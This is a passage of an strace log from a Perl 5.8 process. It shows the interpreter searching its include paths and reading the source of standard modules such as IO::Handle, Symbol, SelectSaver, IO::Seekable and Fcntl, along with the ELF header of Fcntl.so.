$class;\n}\n\n#\n# There is no need for DESTROY to do anything, because when the\n# last reference to an IO object is gone, Perl automatically\n# closes its associated files (if any).  However, to avoid any\n# attempts to autoload DESTROY, we here define it to do nothing.\n#\nsub DESTROY {}\n\n################################################\n## Open and close.\n##\n\nsub _open_mode_string {\n    my ($mode) = @_;\n    $mode =~ /^\\+?(<|>>?)$/\n      or $mode =~ s/^r(\\+?)$/$1</\n      or $mode =~ s/^w(\\+?)$/$1>/\n      or $mode =~ s/^a(\\+?)$/$1>>/\n      or croak \"IO::Handle: bad open mode: $mode\";\n    $mode;\n}\n\nsub fdopen {\n    @_ == 3 or croak \'usage: $io->fdopen(FD, MODE)\';\n    my ($io, $fd, $mode) = @_;\n    local(*GLOB);\n\n    if (ref($fd) && \"\".$fd =~ /GLOB\\(/o) {\n\t# It\'s a glob reference; Alias it as we cannot get name of anon GLOBs\n\tmy $n = qualify(*GLOB);\n\t*GLOB = *{*$fd};\n\t$fd =  $n;\n    } elsif ($fd =~ m#^\\d+$#) {\n\t# It\'s an FD number; prefix with \"=\".\n\t$fd = \"=$fd\";\n    }\n\n    open($io, _open_mode_string($mode) . \'&\' . $fd)\n\t? $io : undef;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $io->close()\';\n    my($io) = @_;\n\n    close($io);\n}\n\n################################################\n## Normal I/O functions.\n##\n\n# flock\n# select\n\nsub opened {\n    @_ == 1 or croak \'usage: $io->opened()\';\n    defined fileno($_[0]);\n}\n\nsub fileno {\n    @_ == 1 or croak \'usage: $io->fileno()\';\n    fileno($_[0]);\n}\n\nsub getc {\n    @_ == 1 or croak \'usage: $io->getc()\';\n    getc($_[0]);\n}\n\nsub eof {\n    @_ == 1 or croak \'usage: $io->eof()\';\n    eof($_[0]);\n}\n\nsub print {\n    @_ or croak \'usage: $io->print(ARGS)\';\n    my $this = shift;\n    print $this @_;\n}\n\nsub printf {\n    @_ >= 2 or croak \'usage: $io->printf(FMT,[ARGS])\';\n    my $this = shift;\n    printf $this @_;\n}\n\nsub getline {\n    @_ == 1 or croak \'usage: $io->getline()\';\n    my $this = shift;\n    return scalar <$this>;\n} \n\n*gets = \\&getline;  # deprecated\n\nsub getlines {\n    @_ == 1 or croak \'usage: $io->getlines()\';\n    wantarray or\n\tcroak \'Can\\\'t call $io->getlines in a scalar context, use $io->getline\';\n    my $this = shift;\n    return <$this>;\n}\n\nsub truncate {\n    @_ == 2 or croak \'usage: $io->truncate(LEN)\';\n    truncate($_[0], $_[1]);\n}\n\nsub read {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->read(BUF, LEN [, OFFSET])\';\n    read($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub sysread {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->sysread(BUF, LEN [, OFFSET])\';\n    sysread($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub write {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->write(BUF [, LEN [, OFFSET]])\';\n    local($\\) = \"\";\n    $_[2] = length($_[1]) unless defined $_[2];\n    print { $_[0] } substr($_[1], $_[3] || 0, $_[2]);\n}\n\nsub syswrite {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->syswrite(BUF [, LEN [, OFFSET]])\';\n    if (defined($_[2])) {\n\tsyswrite($_[0], $_[1], $_[2], $_[3] || 0);\n    } else {\n\tsyswrite($_[0], $_[1]);\n    }\n}\n\nsub stat {\n    @_ == 1 or croak \'u", 4096) = 4096
12518 20:27:41.776880 stat64("/etc/perl/Symbol.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.776897 stat64("/etc/perl/Symbol.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.776911 stat64("/usr/local/lib/perl/5.8.8/Symbol.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.776924 stat64("/usr/local/lib/perl/5.8.8/Symbol.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.776938 stat64("/usr/local/share/perl/5.8.8/Symbol.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.776951 stat64("/usr/local/share/perl/5.8.8/Symbol.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.776965 stat64("/usr/lib/perl5/Symbol.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.776977 stat64("/usr/lib/perl5/Symbol.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.776993 stat64("/usr/share/perl5/Symbol.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.777005 stat64("/usr/share/perl5/Symbol.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.777018 stat64("/usr/lib/perl/5.8/Symbol.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.777031 stat64("/usr/lib/perl/5.8/Symbol.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.777045 stat64("/usr/share/perl/5.8/Symbol.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.777058 stat64("/usr/share/perl/5.8/Symbol.pm", {st_mode=S_IFREG|0644, st_size=2099, ...}) = 0
12518 20:27:41.777079 open("/usr/share/perl/5.8/Symbol.pm", O_RDONLY|O_LARGEFILE) = 8
12518 20:27:41.777094 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa2afe8) = -1 ENOTTY (Inappropriate ioctl for device)
12518 20:27:41.777105 _llseek(8, 0, [0], SEEK_CUR) = 0
12518 20:27:41.777123 read(8, "package Symbol;\n\nBEGIN { require 5.005; }\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(gensym ungensym qualify qualify_to_ref);\n@EXPORT_OK = qw(delete_package geniosym);\n\n$VERSION = \'1.06\';\n\nmy $genpkg = \"Symbol::\";\nmy $genseq = 0;\n\nmy %global = map {$_ => 1} qw(ARGV ARGVOUT ENV INC SIG STDERR STDIN STDOUT);\n\n#\n# Note that we never _copy_ the glob; we just make a ref to it.\n# If we did copy it, then SVf_FAKE would be set on the copy, and\n# glob-specific behaviors (e.g. C<*$ref = \\&func>) wouldn\'t work.\n#\nsub gensym () {\n    my $name = \"GEN\" . $genseq++;\n    my $ref = \\*{$genpkg . $name};\n    delete $$genpkg{$name};\n    $ref;\n}\n\nsub geniosym () {\n    my $sym = gensym();\n    # force the IO slot to be filled\n    select(select $sym);\n    *$sym{IO};\n}\n\nsub ungensym ($) {}\n\nsub qualify ($;$) {\n    my ($name) = @_;\n    if (!ref($name) && index($name, \'::\') == -1 && index($name, \"\'\") == -1) {\n\tmy $pkg;\n\t# Global names: special character, \"^xyz\", or other. \n\tif ($name =~ /^(([^a-z])|(\\^[a-z_]+))\\z/i || $global{$name}) {\n\t    # RGS 2001-11-05 : translate leading ^X to control-char\n\t    $name =~ s/^\\^([a-z_])/\'qq(\\c\'.$1.\')\'/eei;\n\t    $pkg = \"main\";\n\t}\n\telse {\n\t    $pkg = (@_ > 1) ? $_[1] : caller;\n\t}\n\t$name = $pkg . \"::\" . $name;\n    }\n    $name;\n}\n\nsub qualify_to_ref ($;$) {\n    return \\*{ qualify $_[0], @_ > 1 ? $_[1] : caller };\n}\n\n#\n# of Safe.pm lineage\n#\nsub delete_package ($) {\n    my $pkg = shift;\n\n    # expand to full symbol table name if needed\n\n    unless ($pkg =~ /^main::.*::$/) {\n        $pkg = \"main$pkg\"\tif\t$pkg =~ /^::/;\n        $pkg = \"main::$pkg\"\tunless\t$pkg =~ /^main::/;\n        $pkg .= \'::\'\t\tunless\t$pkg =~ /::$/;\n    }\n\n    my($stem, $leaf) = $pkg =~ m/(.*::)(\\w+::)$/;\n    my $stem_symtab = *{$stem}{HASH};\n    return unless defined $stem_symtab and exists $stem_symtab->{$leaf};\n\n    # free all the symbols in the package\n\n    my $leaf_symtab = *{$stem_symtab->{$leaf}}{HASH};\n    foreach my $name (keys %$leaf_symtab) {\n        undef *{$pkg . $name};\n    }\n\n    # delete the symbol table\n\n    %$leaf_symtab = ();\n    delete $stem_symtab->{$leaf};\n}\n\n1;\n", 4096) = 2099
12518 20:27:41.777528 read(8, "", 4096) = 0
12518 20:27:41.777544 close(8)          = 0
12518 20:27:41.777607 stat64("/etc/perl/SelectSaver.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.777623 stat64("/etc/perl/SelectSaver.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.777704 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.777735 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.777751 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.817157 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.817179 stat64("/usr/lib/perl5/SelectSaver.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.817192 stat64("/usr/lib/perl5/SelectSaver.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.817207 stat64("/usr/share/perl5/SelectSaver.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.817220 stat64("/usr/share/perl5/SelectSaver.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.817234 stat64("/usr/lib/perl/5.8/SelectSaver.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.817247 stat64("/usr/lib/perl/5.8/SelectSaver.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.817262 stat64("/usr/share/perl/5.8/SelectSaver.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.817276 stat64("/usr/share/perl/5.8/SelectSaver.pm", {st_mode=S_IFREG|0644, st_size=340, ...}) = 0
12518 20:27:41.817299 open("/usr/share/perl/5.8/SelectSaver.pm", O_RDONLY|O_LARGEFILE) = 8
12518 20:27:41.817315 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa2afe8) = -1 ENOTTY (Inappropriate ioctl for device)
12518 20:27:41.817327 _llseek(8, 0, [0], SEEK_CUR) = 0
12518 20:27:41.817354 read(8, "package SelectSaver;\n\nour $VERSION = \'1.01\';\n\nrequire 5.000;\nuse Carp;\nuse Symbol;\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new SelectSaver [FILEHANDLE]\';\n    my $fh = select;\n    my $self = bless \\$fh, $_[0];\n    select qualify($_[1], caller) if @_ > 1;\n    $self;\n}\n\nsub DESTROY {\n    my $self = $_[0];\n    select $$self;\n}\n\n1;\n", 4096) = 340
12518 20:27:41.817503 brk(0x81d6000)    = 0x81d6000
12518 20:27:41.817536 read(8, "", 4096) = 0
12518 20:27:41.817548 close(8)          = 0
12518 20:27:41.817971 read(6, "sage: $io->stat()\';\n    stat($_[0]);\n}\n\n################################################\n## State modification functions.\n##\n\nsub autoflush {\n    my $old = new SelectSaver qualify($_[0], caller);\n    my $prev = $|;\n    $| = @_ > 1 ? $_[1] : 1;\n    $prev;\n}\n\nsub output_field_separator {\n    carp \"output_field_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $,;\n    $, = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub output_record_separator {\n    carp \"output_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $\\;\n    $\\ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_record_separator {\n    carp \"input_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $/;\n    $/ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_line_number {\n    local $.;\n    () = tell qualify($_[0], caller) if ref($_[0]);\n    my $prev = $.;\n    $. = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_page_number {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $%;\n    $% = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_per_page {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $=;\n    $= = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_left {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $-;\n    $- = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $~;\n    $~ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_top_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $^;\n    $^ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_line_break_characters {\n    carp \"format_line_break_characters is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $:;\n    $: = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_formfeed {\n    carp \"format_formfeed is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $^L;\n    $^L = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub formline {\n    my $io = shift;\n    my $picture = shift;\n    local($^A) = $^A;\n    local($\\) = \"\";\n    formline($picture, @_);\n    print $io $^A;\n}\n\nsub format_write {\n    @_ < 3 || croak \'usage: $io->write( [FORMAT_NAME] )\';\n    if (@_ == 2) {\n\tmy ($io, $fmt) = @_;\n\tmy $oldfmt = $io->format_name($fmt);\n\tCORE::write($io);\n\t$io->format_name($oldfmt);\n    } else {\n\tCORE::write($_[0]);\n    }\n}\n\n# XXX undocumented\nsub fcntl {\n    @_ == 3 || croak \'usage: $io->fcntl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return fcntl($io, $op, $_[2]);\n}\n\n# XXX undocumented\nsub ioctl {\n    @_ == 3 || croak \'usage: $io->ioctl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return ioctl($io, $op, $_[2]);\n}\n\n# this sub is for compatability with older releases of IO that used\n# a sub called constant to detemine if a constant existed -- GMB\n#\n# The SEEK_* and _IO?BF constants were the only constants at that time\n# any new code should just chech defined(&CONSTANT_NAME)\n\nsub constant {\n    no strict \'refs\';\n    my $name = shift;\n    (($name =~ /^(SEEK_(SET|CUR|END)|_IO[FLN]BF)$/) && defined &{$name})\n\t? &{$name}() : undef;\n}\n\n# so that flush.pl can be deprecated\n\nsub printflush {\n    my $io = shift;\n    my $old;\n    $old = new SelectSaver qualify($io, caller) if ref($io);\n    local $| = 1;\n    if(ref($io)) {\n        print $io @_;\n    }\n    else {\n\tprint @_;\n    }\n}\n\n1;\n", 4096) = 3496
12518 20:27:41.818733 read(6, "", 4096) = 0
12518 20:27:41.818751 close(6)          = 0
12518 20:27:41.818793 stat64("/etc/perl/IO/Seekable.pmc", 0xbfa2b77c) = -1 ENOENT (No such file or directory)
12518 20:27:41.818809 stat64("/etc/perl/IO/Seekable.pm", 0xbfa2b68c) = -1 ENOENT (No such file or directory)
12518 20:27:41.818824 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pmc", 0xbfa2b77c) = -1 ENOENT (No such file or directory)
12518 20:27:41.818838 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pm", 0xbfa2b68c) = -1 ENOENT (No such file or directory)
12518 20:27:41.818852 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pmc", 0xbfa2b77c) = -1 ENOENT (No such file or directory)
12518 20:27:41.818865 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pm", 0xbfa2b68c) = -1 ENOENT (No such file or directory)
12518 20:27:41.818880 stat64("/usr/lib/perl5/IO/Seekable.pmc", 0xbfa2b77c) = -1 ENOENT (No such file or directory)
12518 20:27:41.818892 stat64("/usr/lib/perl5/IO/Seekable.pm", 0xbfa2b68c) = -1 ENOENT (No such file or directory)
12518 20:27:41.818906 stat64("/usr/share/perl5/IO/Seekable.pmc", 0xbfa2b77c) = -1 ENOENT (No such file or directory)
12518 20:27:41.818918 stat64("/usr/share/perl5/IO/Seekable.pm", 0xbfa2b68c) = -1 ENOENT (No such file or directory)
12518 20:27:41.818932 stat64("/usr/lib/perl/5.8/IO/Seekable.pmc", 0xbfa2b77c) = -1 ENOENT (No such file or directory)
12518 20:27:41.818949 stat64("/usr/lib/perl/5.8/IO/Seekable.pm", {st_mode=S_IFREG|0644, st_size=686, ...}) = 0
12518 20:27:41.818972 open("/usr/lib/perl/5.8/IO/Seekable.pm", O_RDONLY|O_LARGEFILE) = 6
12518 20:27:41.818987 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa2b498) = -1 ENOTTY (Inappropriate ioctl for device)
12518 20:27:41.818999 _llseek(6, 0, [0], SEEK_CUR) = 0
12518 20:27:41.819018 read(6, "#\n\npackage IO::Seekable;\n\nuse 5.006_001;\nuse Carp;\nuse strict;\nour($VERSION, @EXPORT, @ISA);\nuse IO::Handle ();\n# XXX we can\'t get these from IO::Handle or we\'ll get prototype\n# mismatch warnings on C<use POSIX; use IO::File;> :-(\nuse Fcntl qw(SEEK_SET SEEK_CUR SEEK_END);\nrequire Exporter;\n\n@EXPORT = qw(SEEK_SET SEEK_CUR SEEK_END);\n@ISA = qw(Exporter);\n\n$VERSION = \"1.10\";\n$VERSION = eval $VERSION;\n\nsub seek {\n    @_ == 3 or croak \'usage: $io->seek(POS, WHENCE)\';\n    seek($_[0], $_[1], $_[2]);\n}\n\nsub sysseek {\n    @_ == 3 or croak \'usage: $io->sysseek(POS, WHENCE)\';\n    sysseek($_[0], $_[1], $_[2]);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $io->tell()\';\n    tell($_[0]);\n}\n\n1;\n", 4096) = 686
12518 20:27:41.819151 stat64("/etc/perl/Fcntl.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.819166 stat64("/etc/perl/Fcntl.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.819221 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.819252 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.819266 stat64("/usr/local/share/perl/5.8.8/Fcntl.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.819279 stat64("/usr/local/share/perl/5.8.8/Fcntl.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.819293 stat64("/usr/lib/perl5/Fcntl.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.819305 stat64("/usr/lib/perl5/Fcntl.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.819318 stat64("/usr/share/perl5/Fcntl.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.819330 stat64("/usr/share/perl5/Fcntl.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:41.819344 stat64("/usr/lib/perl/5.8/Fcntl.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:41.819356 stat64("/usr/lib/perl/5.8/Fcntl.pm", {st_mode=S_IFREG|0644, st_size=3458, ...}) = 0
12518 20:27:41.819378 open("/usr/lib/perl/5.8/Fcntl.pm", O_RDONLY|O_LARGEFILE) = 8
12518 20:27:41.819392 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa2afe8) = -1 ENOTTY (Inappropriate ioctl for device)
12518 20:27:41.819403 _llseek(8, 0, [0], SEEK_CUR) = 0
12518 20:27:41.819422 read(8, "package Fcntl;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS, $AUTOLOAD);\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n$VERSION = \"1.05\";\n# Items to export into callers namespace by default\n# (move infrequently used names to @EXPORT_OK below)\n@EXPORT =\n  qw(\n\tFD_CLOEXEC\n\tF_ALLOCSP\n\tF_ALLOCSP64\n\tF_COMPAT\n\tF_DUP2FD\n\tF_DUPFD\n\tF_EXLCK\n\tF_FREESP\n\tF_FREESP64\n\tF_FSYNC\n\tF_FSYNC64\n\tF_GETFD\n\tF_GETFL\n\tF_GETLK\n\tF_GETLK64\n\tF_GETOWN\n\tF_NODNY\n\tF_POSIX\n\tF_RDACC\n\tF_RDDNY\n\tF_RDLCK\n\tF_RWACC\n\tF_RWDNY\n\tF_SETFD\n\tF_SETFL\n\tF_SETLK\n\tF_SETLK64\n\tF_SETLKW\n\tF_SETLKW64\n\tF_SETOWN\n\tF_SHARE\n\tF_SHLCK\n\tF_UNLCK\n\tF_UNSHARE\n\tF_WRACC\n\tF_WRDNY\n\tF_WRLCK\n\tO_ACCMODE\n\tO_ALIAS\n\tO_APPEND\n\tO_ASYNC\n\tO_BINARY\n\tO_CREAT\n\tO_DEFER\n\tO_DIRECT\n\tO_DIRECTORY\n\tO_DSYNC\n\tO_EXCL\n\tO_EXLOCK\n\tO_LARGEFILE\n\tO_NDELAY\n\tO_NOCTTY\n\tO_NOFOLLOW\n\tO_NOINHERIT\n\tO_NONBLOCK\n\tO_RANDOM\n\tO_RAW\n\tO_RDONLY\n\tO_RDWR\n\tO_RSRC\n\tO_RSYNC\n\tO_SEQUENTIAL\n\tO_SHLOCK\n\tO_SYNC\n\tO_TEMPORARY\n\tO_TEXT\n\tO_TRUNC\n\tO_WRONLY\n     );\n\n# Other items we are prepared to export if requested\n@EXPORT_OK = qw(\n\tDN_ACCESS\n\tDN_ATTRIB\n\tDN_CREATE\n\tDN_DELETE\n\tDN_MODIFY\n\tDN_MULTISHOT\n\tDN_RENAME\n\tFAPPEND\n\tFASYNC\n\tFCREAT\n\tFDEFER\n\tFDSYNC\n\tFEXCL\n\tFLARGEFILE\n\tFNDELAY\n\tFNONBLOCK\n\tFRSYNC\n\tFSYNC\n\tFTRUNC\n\tF_GETLEASE\n\tF_GETSIG\n\tF_NOTIFY\n\tF_SETLEASE\n\tF_SETSIG\n\tLOCK_EX\n\tLOCK_MAND\n\tLOCK_NB\n\tLOCK_READ\n\tLOCK_RW\n\tLOCK_SH\n\tLOCK_UN\n\tLOCK_WRITE\n\tO_IGNORE_CTTY\n\tO_NOATIME\n\tO_NOLINK\n\tO_NOTRANS\n\tSEEK_CUR\n\tSEEK_END\n\tSEEK_SET\n\tS_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\tS_IREAD S_IWRITE S_IEXEC\n\tS_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\tS_IROTH S_IWOTH S_IXOTH S_IRWXO\n\tS_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\tS_ISUID S_ISGID S_ISVTX S_ISTXT\n\t_S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t&S_ISREG &S_ISDIR &S_ISLNK &S_ISSOCK &S_ISBLK &S_ISCHR &S_ISFIFO\n\t&S_ISWHT &S_ISENFMT &S_IFMT &S_IMODE\n);\n# Named groups of exports\n%EXPORT_TAGS = (\n    \'flock\'   => [qw(LOCK_SH LOCK_EX LOCK_NB LOCK_UN)],\n    \'Fcompat\' => [qw(FAPPEND FASYNC FCREAT FDEFER FDSYNC FEXCL FLARGEFILE\n\t\t     FNDELAY FNONBLOCK FRSYNC FSYNC FTRUNC)],\n    \'seek\'    => [qw(SEEK_SET SEEK_CUR SEEK_END)],\n    \'mode\'    => [qw(S_ISUID S_ISGID S_ISVTX S_ISTXT\n\t\t     _S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t\t     S_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\t\t     S_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\t\t     S_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\t\t     S_IROTH S_IWOTH S_IXOTH S_IRWXO\n\t\t     S_IREAD S_IWRITE S_IEXEC\n\t\t     S_ISREG S_ISDIR S_ISLNK S_ISSOCK\n\t\t     S_ISBLK S_ISCHR S_ISFIFO\n\t\t     S_ISWHT S_ISENFMT\t\t\n\t\t     S_IFMT S_IMODE\n                  )],\n);\n\nsub S_IFMT  { @_ ? ( $_[0] & _S_IFMT() ) : _S_IFMT()  }\nsub S_IMODE { $_[0] & 07777 }\n\nsub S_ISREG    { ( $_[0] & _S_IFMT() ) == S_IFREG()   }\nsub S_ISDIR    { ( $_[0] & _S_IFMT() ) == S_IFDIR()   }\nsub S_ISLNK    { ( $_[0] & _S_IFMT() ) == S_IFLNK()   }\nsub S_ISSOCK   { ( $_[0] & _S_IFMT() ) == S_IFSOCK()  }\nsub S_ISBLK    { ( $_[0] & _S_IFMT() ) == S_IFBLK()   }\nsub S_ISCHR    { ( $_[0] & _S_IFMT() ) == S_IFCHR()   }\nsub S_ISFIFO   { ( $_[0] & _S_IFMT() ) == S_IFIFO()   }\nsub S_ISWHT    { ( $_[0] & _S_IFMT() ) == S_IFWHT()   }\nsub S_ISENFMT  { ( $_[0] & _S_IFMT() ) == S_IFENFMT() }\n\nsub AUTOLOAD {\n    (my $constname = $AUTOLOAD) =~ s/.*:://;\n    die \"&Fcntl::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n        my (undef,$file,$line) = caller;\n        die \"$error at $file line $line.\\n\";\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Fcntl\', $VERSION;\n\n1;\n", 4096) = 3458
12518 20:27:41.819816 brk(0x81f7000)    = 0x81f7000
12518 20:27:41.820005 read(8, "", 4096) = 0
12518 20:27:41.857199 close(8)          = 0
12518 20:27:41.857305 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
12518 20:27:41.857338 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
12518 20:27:41.857369 open("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", O_RDONLY) = 8
12518 20:27:41.857385 read(8, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0 \10\0\0004\0\0\0\274,\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274*\0\0\274*\0\0\5\0\0\0\0\20\0\0\1\0\0\0\274*\0\0\274:\0\0\274:\0\0T\1\0\0X\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320*\0\0\320:\0\0\320:\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\21\0\0\0\36\0\0\0\0\0\0\0\25\0\0\0\32\0\0\0\24\0\0\0\5\0\0\0\t\0\0\0\0\0\0\0\23\0\0\0\21\0\0\0\34\0\0\0\4\0\0\0\26\0\0\0\0\0\0\0\30\0\0\0\17\0\0\0\27\0\0\0\r\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\1\0\0\0\0\0\0\0\3\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\v\0\0\0\6\0\0\0\35\0\0\0\7\0\0\0\0\0\0\0\22\0\0\0\31\0\0\0\33\0\0\0\20\0\0\0\16\0\0\0\n\0\0\0\0\0\0\0\f\0\0\0\10\0\0\0\0\0\0\0\3\0\0\0\27\0\0\0\2\0\0\0\6\0\0\0\210\0 \1\0\304H\t\27\0\0\0\32\0\0\0\35\0\0\0\356TU\220\272\343\222|CE\325\354.6bx\330qX\34\271\215\361\16\353\323\357\16\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\353\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0j\1\0\0\0\0\0\0\0\0\0\0\20\0\0\0\337\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0u\0\0\0\0\0\0\0", 512) = 512
12518 20:27:41.857482 fstat64(8, {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
12518 20:27:41.857501 mmap2(NULL, 15380, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 8, 0) = 0xb7db1000
12518 20:27:41.857516 mmap2(0xb7db4000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x2) = 0xb7db4000
12518 20:27:41.857532 close(8)          = 0
12518 20:27:41.857819 read(6, "", 4096) = 0
12518 20:27:41.857855 close(6)          = 0
12518 20:27:41.857891 stat64("/etc/perl/IO/File.pmc", 0xbfa2b77c) = -1 ENOENT (No such file or directory)
12518 20:27:41.857915 stat64("/etc/perl/IO/File.pm", 0xbfa2b68c) = -1 ENOENT (No such file or directory)
12518 20:27:41.857930 stat64("/usr/local/lib/perl/5.8.8/IO/File.pmc", 0xbfa2b77c) = -1 ENOENT (No such file or directory)
